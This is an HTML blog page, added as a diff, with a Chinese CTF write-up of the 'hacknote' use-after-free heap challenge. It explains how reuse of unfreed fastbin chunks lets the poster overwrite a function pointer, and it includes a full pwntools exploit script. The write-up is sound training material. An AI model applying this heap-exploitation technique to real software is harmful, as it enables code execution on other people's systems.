@@ -1,0 +1,505 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CAI dog</title>
+<meta name="keywords" content="">
+<meta name="description" content="此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)
+首先查看一下保护：
+可以发现这居然是一个32位程序，并且没有开启pie
+随后运行一下程序：
+可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。
+随后我们来到ida查看这些功能的细节：
+在查看添加函数时，我们发现存在一个名为v0的结构体：
+通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。
+**注意：**这里的content也是通过malloc函数分配的空间。
+随后我们看到删除函数：
+可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件
+结合刚刚程序的流程，我们可以得出一条利用方式：
+首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块
+**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。
+当我们创建两个note后，我们需要将这两个note给删除。
+这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：
+但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。
+这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。
+那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。
+最后数据就会变为这样：
+可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。
+如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。
+同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。
+#!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./hacknote&#39;)magic = 0x08048986p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;aaaa&#39;)p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;bbbb&#39;)p.recvuntil(&#39;Your choice :&#39;)p.">
+<meta name="author" content="shangdi4sb">
+<link rel="canonical" href="https://jellyfish-pro.github.io/ctf/use_after_free/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3613efbd0b1772781e8f49935e973cae632a7f61471c05b17be155505ccf87b5.css" integrity="sha256-NhPvvQsXcngej0mTXpc8rmMqf2FHHAWxe&#43;FVUFzPh7U=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://jellyfish-pro.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jellyfish-pro.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jellyfish-pro.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jellyfish-pro.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jellyfish-pro.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="" />
+<meta property="og:description" content="此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)
+首先查看一下保护：
+可以发现这居然是一个32位程序，并且没有开启pie
+随后运行一下程序：
+可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。
+随后我们来到ida查看这些功能的细节：
+在查看添加函数时，我们发现存在一个名为v0的结构体：
+通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。
+**注意：**这里的content也是通过malloc函数分配的空间。
+随后我们看到删除函数：
+可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件
+结合刚刚程序的流程，我们可以得出一条利用方式：
+首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块
+**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。
+当我们创建两个note后，我们需要将这两个note给删除。
+这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：
+但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。
+这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。
+那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。
+最后数据就会变为这样：
+可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。
+如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。
+同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。
+#!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./hacknote&#39;)magic = 0x08048986p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;aaaa&#39;)p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;bbbb&#39;)p.recvuntil(&#39;Your choice :&#39;)p." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://jellyfish-pro.github.io/ctf/use_after_free/" /><meta property="article:section" content="ctf" />
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)
+首先查看一下保护：
+可以发现这居然是一个32位程序，并且没有开启pie
+随后运行一下程序：
+可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。
+随后我们来到ida查看这些功能的细节：
+在查看添加函数时，我们发现存在一个名为v0的结构体：
+通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。
+**注意：**这里的content也是通过malloc函数分配的空间。
+随后我们看到删除函数：
+可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件
+结合刚刚程序的流程，我们可以得出一条利用方式：
+首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块
+**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。
+当我们创建两个note后，我们需要将这两个note给删除。
+这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：
+但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。
+这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。
+那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。
+最后数据就会变为这样：
+可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。
+如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。
+同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。
+#!/usr/bin/python3#Use_After_free_exp.py#lab 10 hacknotefrom pwn import *context.log_level = &#39;debug&#39;p = process(&#39;./hacknote&#39;)magic = 0x08048986p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;aaaa&#39;)p.recvuntil(&#39;Your choice :&#39;)p.send(&#39;1&#39;)p.recvuntil(&#39;Note size :&#39;)p.send(&#39;16&#39;)p.recvuntil(&#39;Content :&#39;)p.send(&#39;bbbb&#39;)p.recvuntil(&#39;Your choice :&#39;)p."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "ctf",
+      "item": "https://jellyfish-pro.github.io/ctf/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "",
+      "item": "https://jellyfish-pro.github.io/ctf/use_after_free/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "",
+  "name": "",
+  "description": "此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)\n首先查看一下保护：\n可以发现这居然是一个32位程序，并且没有开启pie\n随后运行一下程序：\n可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。\n随后我们来到ida查看这些功能的细节：\n在查看添加函数时，我们发现存在一个名为v0的结构体：\n通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。\n**注意：**这里的content也是通过malloc函数分配的空间。\n随后我们看到删除函数：\n可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件\n结合刚刚程序的流程，我们可以得出一条利用方式：\n首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块\n**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。\n当我们创建两个note后，我们需要将这两个note给删除。\n这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：\n但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。\n这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。\n那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。\n最后数据就会变为这样：\n可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。\n如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。\n同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。\n#!/usr/bin/python3\r#Use_After_free_exp.py\r#lab 10 hacknote\rfrom pwn import *\rcontext.log_level = \u0026#39;debug\u0026#39;\rp = process(\u0026#39;./hacknote\u0026#39;)\rmagic = 0x08048986\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Note size :\u0026#39;)\rp.send(\u0026#39;16\u0026#39;)\rp.recvuntil(\u0026#39;Content :\u0026#39;)\rp.send(\u0026#39;aaaa\u0026#39;)\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.send(\u0026#39;1\u0026#39;)\rp.recvuntil(\u0026#39;Note size :\u0026#39;)\rp.send(\u0026#39;16\u0026#39;)\rp.recvuntil(\u0026#39;Content :\u0026#39;)\rp.send(\u0026#39;bbbb\u0026#39;)\rp.recvuntil(\u0026#39;Your choice :\u0026#39;)\rp.",
+  "keywords": [
+    
+  ],
+  "articleBody": "此例题来自于Use After Free - CTF Wiki (ctf-wiki.org)\n首先查看一下保护：\n可以发现这居然是一个32位程序，并且没有开启pie\n随后运行一下程序：\n可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。\n随后我们来到ida查看这些功能的细节：\n在查看添加函数时，我们发现存在一个名为v0的结构体：\n通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放notelist[i]。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。\n**注意：**这里的content也是通过malloc函数分配的空间。\n随后我们看到删除函数：\n可以看到删除函数并没有对删除后的空间置零，这就为我们Use_After_free提供了利用条件\n结合刚刚程序的流程，我们可以得出一条利用方式：\n首先，创建两个note，每个note程序会生成两个堆块，所以一共会生成4个堆块\n**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。\n当我们创建两个note后，我们需要将这两个note给删除。\n这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入fastbins中：\n但是由于程序在free堆块时没有置零，所以note1中还存放着input和content_addr。\n这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。\n那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。\n最后数据就会变为这样：\n可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。\n如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。\n同时，程序中有一个magic函数，专门用来输出flag，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。\n#!/usr/bin/python3\r#Use_After_free_exp.py\r#lab 10 hacknote\rfrom pwn import *\rcontext.log_level = 'debug'\rp = process('./hacknote')\rmagic = 0x08048986\rp.recvuntil('Your choice :')\rp.send('1')\rp.recvuntil('Note size :')\rp.send('16')\rp.recvuntil('Content :')\rp.send('aaaa')\rp.recvuntil('Your choice :')\rp.send('1')\rp.recvuntil('Note size :')\rp.send('16')\rp.recvuntil('Content :')\rp.send('bbbb')\rp.recvuntil('Your choice :')\rp.send('2')\rp.recvuntil('Index :')\rp.send('0')\rp.recvuntil('Your choice :')\rp.send('2')\rp.recvuntil('Index :')\rp.send('1')\r# gdb.attach(p)\rp.recvuntil('Your choice :')\rp.send('1')\r# pause()\rp.recvuntil('Note size :')\rp.send('8')\rp.recvuntil('Content :')\rp.send(p32(magic))\rp.recvuntil('Your choice :')\rp.send('3')\rp.recvuntil('Index :')\rp.send('0')\rp.interactive() ",
+  "wordCount" : "106",
+  "inLanguage": "en",
+  "datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "shangdi4sb"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://jellyfish-pro.github.io/ctf/use_after_free/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "CAI dog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://jellyfish-pro.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jellyfish-pro.github.io" accesskey="h" title="CAI dog (Alt + H)">CAI dog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://jellyfish-pro.github.io/search" title="search (Alt &#43; /)" accesskey=/>
+                    <span>search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/" title="home">
+                    <span>home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/posts" title="posts">
+                    <span>posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/note" title="note">
+                    <span>note</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://jellyfish-pro.github.io/ctf" title="ctf">
+                    <span>ctf</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://jellyfish-pro.github.io">Home</a>&nbsp;»&nbsp;<a href="https://jellyfish-pro.github.io/ctf/">ctf</a></div>
+    <h1 class="post-title">
+      
+    </h1>
+    <div class="post-meta">1 min&nbsp;·&nbsp;shangdi4sb
+
+</div>
+  </header> 
+
+  <div class="post-content"><p>此例题来自于<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/use-after-free/">Use After Free - CTF Wiki (ctf-wiki.org)</a></p>
+<p>首先查看一下保护：</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704091210659.png" alt="image-20230704091210659"  />
+</p>
+<p>可以发现这居然是一个32位程序，并且没有开启pie</p>
+<p>随后运行一下程序：</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704091605647.png" alt="image-20230704091605647"  />
+</p>
+<p>可以看到这时一个菜单题目，提供了添加、删除、打印和退出功能。</p>
+<p>随后我们来到ida查看这些功能的细节：</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704101745185.png" alt="image-20230704101745185"  />
+</p>
+<p>在查看添加函数时，我们发现存在一个名为<em>v0</em>的结构体：</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704101816178.png" alt="image-20230704101816178"  />
+</p>
+<p>通过上面的添加函数的代码，我们可以知道，程序会分配一个8字节空间来存放<em>notelist[i]</em>。而结合结构体可知*notelist[i]*前四字节为一个函数指针，后4字节存放的是content的地址。</p>
+<p>**注意：**这里的content也是通过malloc函数分配的空间。</p>
+<p>随后我们看到删除函数：</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704102803177.png" alt="image-20230704102803177"  />
+</p>
+<p>可以看到删除函数并没有对删除后的空间置零，这就为我们<em>Use_After_free</em>提供了利用条件</p>
+<p>结合刚刚程序的流程，我们可以得出一条利用方式：</p>
+<p>首先，创建两个<em>note</em>，每个<em>note</em>程序会生成两个堆块，所以一共会生成4个堆块</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704104252786.png" alt="image-20230704104252786"  />
+</p>
+<p>**注意：**虽然conten的大小是可以控制的，但是我们不能将其大小设定为8字节。具体原因下面会说。</p>
+<p>当我们创建两个note后，我们需要将这两个note给删除。</p>
+<p>这时，由于两个note都拥有一个0x8大小的堆块，所以这个两个堆块会被放入<em>fastbins</em>中：</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704105558154.png" alt="image-20230704105558154"  />
+</p>
+<p>但是由于程序在<em>free</em>堆块时没有置零，所以note1中还存放着<em>input</em>和<em>content_addr</em>。</p>
+<p>这时，如果我们再申请两个0x8大小的堆块，由于fastbins的分配方式，系统会直接把这两个没有置零的堆块分配给我们。</p>
+<p>那么如何申请两个0x8大小的堆块呢？我们只需要创建一个note，再将content的大小也设置为0x8就好了。</p>
+<p>最后数据就会变为这样：</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704110927262.png" alt="image-20230704110927262"  />
+</p>
+<p>可以看到，由于新content包含了旧note1_input函数指针，那么我们在输入content时，就可以覆盖掉note1_input。</p>
+<p>如果这时，我们再访问note1，那么程序就会来到note1_input函数处，这也就意味着我们做到了任意地址访问。</p>
+<p>同时，程序中有一个<em>magic</em>函数，专门用来输出<em>flag</em>，所以我们直接用这个函数地址覆盖掉原来的note1_input就可以拿到flag。</p>
+<p><img loading="lazy" src="C:%5cUsers%5cshangdi4sb%5cDesktop%5cctf%5cUse_After_free.assets%5cimage-20230704112327257.png" alt="image-20230704112327257"  />
+</p>
+<pre tabindex="0"><code>#!/usr/bin/python3
+
+#Use_After_free_exp.py
+#lab 10 hacknote
+
+from pwn import *
+context.log_level = &#39;debug&#39;
+
+p = process(&#39;./hacknote&#39;)
+
+magic = 0x08048986
+
+p.recvuntil(&#39;Your choice :&#39;)
+p.send(&#39;1&#39;)
+p.recvuntil(&#39;Note size :&#39;)
+p.send(&#39;16&#39;)
+p.recvuntil(&#39;Content :&#39;)
+p.send(&#39;aaaa&#39;)
+p.recvuntil(&#39;Your choice :&#39;)
+p.send(&#39;1&#39;)
+p.recvuntil(&#39;Note size :&#39;)
+p.send(&#39;16&#39;)
+p.recvuntil(&#39;Content :&#39;)
+p.send(&#39;bbbb&#39;)
+p.recvuntil(&#39;Your choice :&#39;)
+p.send(&#39;2&#39;)
+p.recvuntil(&#39;Index :&#39;)
+p.send(&#39;0&#39;)
+p.recvuntil(&#39;Your choice :&#39;)
+p.send(&#39;2&#39;)
+p.recvuntil(&#39;Index :&#39;)
+p.send(&#39;1&#39;)
+# gdb.attach(p)
+p.recvuntil(&#39;Your choice :&#39;)
+p.send(&#39;1&#39;)
+# pause()
+p.recvuntil(&#39;Note size :&#39;)
+p.send(&#39;8&#39;)
+p.recvuntil(&#39;Content :&#39;)
+p.send(p32(magic))
+
+p.recvuntil(&#39;Your choice :&#39;)
+p.send(&#39;3&#39;)
+p.recvuntil(&#39;Index :&#39;)
+p.send(&#39;0&#39;)
+
+p.interactive()
+</code></pre>
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://jellyfish-pro.github.io/ctf/%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>[置顶] 注意事项</span>
+  </a>
+  <a class="next" href="https://jellyfish-pro.github.io/ctf/enumcanary/">
+    <span class="title">Next »</span>
+    <br>
+    <span>enumcanary</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2023 <a href="https://jellyfish-pro.github.io">CAI dog</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
